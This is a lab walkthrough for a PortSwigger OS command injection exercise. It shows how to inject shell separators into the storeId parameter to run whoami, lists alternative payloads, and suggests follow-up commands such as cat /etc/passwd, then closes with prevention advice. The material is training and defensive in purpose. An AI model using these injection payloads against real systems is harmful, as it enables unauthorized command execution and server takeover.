# Command Injection - Lab #1: OS Command Injection, Simple Case

**YouTube Tutorial:** [Command Injection - Lab #1 OS command injection, simple case (Short Version)](https://youtu.be/GDUadTiXXVk)

---

## 1. What is OS Command Injection?

### Core Concept

OS command injection (also called **shell injection**) occurs when an application passes user-supplied input directly into a **shell command** executed on the server, without sanitization. Because the input is concatenated into the command line, the attacker can inject **shell metacharacters** (`|`, `;`, `&`, `&&`, `||`, `` ` ``, `$()`) to break out of the intended argument and execute **arbitrary OS commands**.

Unlike SQL injection, which targets the database, command injection targets the **operating system itself** — and the output of the injected command can be returned directly in the HTTP response:

* **Normal Input:** `storeId=1` → the server runs something like `stockreport.pl 1 1` → response: `22` (stock units only).
* **Injected Input:** `storeId=1|whoami` → the server runs `stockreport.pl 1 1|whoami` → response: `peter-AbCdEfGh` (the OS username).

The pipe `|` makes the shell execute `whoami` as a **second command**, and its stdout is returned in the application's response. The lab's goal is simply to execute `whoami` and read the username.

---

## 2. Attack Overview & Key Concepts

### Vulnerability Explanation

* **Vulnerable Feature:** The product **stock checker** on any product page.
* **Vulnerable Parameter:** `storeId` (and often `productId`) in the `POST /product/stock` request.
* **Command Injection Mechanism:** The application executes a shell command containing user-supplied product and store IDs, and returns the **raw output** of the command in the HTTP response.
* **Injection Type:** **In-band / non-blind** — the command output is reflected directly in the response body; no timing, redirection, or out-of-band techniques are needed.
* **End Goal:** Execute `whoami` to determine the name of the current user.

### Root Cause & Impact

* **Root Cause:** User-controlled values are concatenated into an OS shell command with no escaping and no allow-listing (e.g., the backend calls `system("stockreport.pl " . $productId . " " . $storeId)`).
* **Impact:** Arbitrary command execution as the web server user — file read/write, reverse shells, and full server compromise are all possible.
* **End Goal:** Run `whoami` and observe the returned OS username to solve the lab.

---

## 3. Attack Methods & Techniques

### Method Details

* **Phase 1 (Capture the Request):** Use the stock checker and intercept the `POST /product/stock` request in **Burp Proxy**, then send it to **Repeater**.
* **Phase 2 (Choose a Separator):** Inject a shell metacharacter followed by `whoami` into the `storeId` parameter. The pipe `|` is the official solution, but `;`, `&`, `&&`, `||`, `` ` ``, and `$()` also work.
* **Phase 3 (URL-encode if Needed):** Encode special characters with **Ctrl+U** in Repeater (`&` → `%26`, `|` → `%7C`, space → `%20`).
* **Phase 4 (Read the Output):** Send the request and find the username in the response body.

### Server Behavior

* **Normal request:** Response body is a plain number (the stock count), e.g. `22`.
* **Successful injection:** Response body contains the **command output** — the current OS username.
* **Broken injection (unencoded `&`):** The request may error or produce odd output because `&` is also a form-parameter separator — encode it and resend.

---

## 4. Step-by-Step Walkthrough

### Step 1: Intercept the Stock Check Request

1. Open any product page in the lab.
2. Pick a store/location and click **"Check stock"**.
3. In Burp, find the `POST /product/stock` request in **Proxy → HTTP history** and send it to **Repeater**.

```http
POST /product/stock HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=[SESSION-COOKIE]

productId=1&storeId=1
```

### Step 2: Inject `whoami` via the Pipe Operator

1. Modify the `storeId` parameter:

```http
productId=1&storeId=1|whoami
```

2. **Result:** The response contains the **name of the current user** (e.g. `peter-AbCdEfGh`), which solves the lab.

### Step 3: URL-Encode the Payload (If the Request Breaks)

1. If your separator or spaces cause issues, highlight the payload in Repeater and press **Ctrl+U** to URL-encode key characters:

```http
productId=1&storeId=1%7cwhoami
```

2. **Result:** Same output — username visible in the response.

### Step 4: Confirm the Lab Is Solved

1. Check the lab banner — it displays **"Congratulations, you solved the lab!"**.
2. (Optional) In **HTTP history**, click the request to see the raw response containing the `whoami` output in plain text.

### Alternative Payloads (All Work for the Simple Case)

```http
storeId=1;whoami
storeId=1&whoami            → URL-encoded: 1%26whoami
storeId=1&&whoami           → URL-encoded: 1%26%26whoami
storeId=1||whoami
storeId=`whoami`
storeId=$(whoami)
```

**Tip from Rana's video:** If leftover trailing arguments break the command, comment them out with `#` (Linux):

```http
storeId=1;whoami#
```

---

## 5. Pro-Tips & Common Pitfalls

* **URL-encode shell characters in form bodies:** In `application/x-www-form-urlencoded`, `&` splits parameters, so `1&whoami` without encoding sends `whoami` as a separate parameter. Always encode `&` → `%26`, `|` → `%7C`, space → `%20`. Shortcut: highlight payload → **Ctrl+U**.
* **Both parameters may be injectable:** Test `productId` as well as `storeId`. The official solution uses `storeId=1|whoami`.
* **The output is in-band:** Unlike the blind command-injection labs (#2–#5), this one returns the raw command stdout in the HTTP body — no time delays, no `>/var/www/images/output.txt`, no Collaborator needed.
* **`whoami` is the win condition:** The lab only requires executing `whoami`; a reverse shell or `cat /etc/passwd` is unnecessary (though fine to try after solving).
* **No Burp Pro required:** Fully solvable with **Burp Suite Community Edition** (Proxy + Repeater only).
* **Try these after solving (for practice):**

```bash
id                    # uid/gid/groups
uname -a              # kernel / OS info
ls -la                # list files in the app directory
cat /etc/passwd       # local users (if readable)
pwd                   # current working directory
```

* **The vulnerable backend pattern (what you're abusing):**

```php
// ❌ VULNERABLE — user input concatenated into a shell command
system("stockreport.pl " . $_POST['productId'] . " " . $_POST['storeId']);

// ✅ SAFE — validate/allow-list IDs, or call with an argv array (no shell)
```

* **Prevention summary:**
  * Never pass user input into `system()`, `exec()`, `shell_exec()`, `popen()`, or backticks.
  * If you must run OS commands, use APIs that accept **argument arrays** so the shell never interprets the input.
  * Allow-list inputs (numeric IDs only) and run the app as a low-privilege user.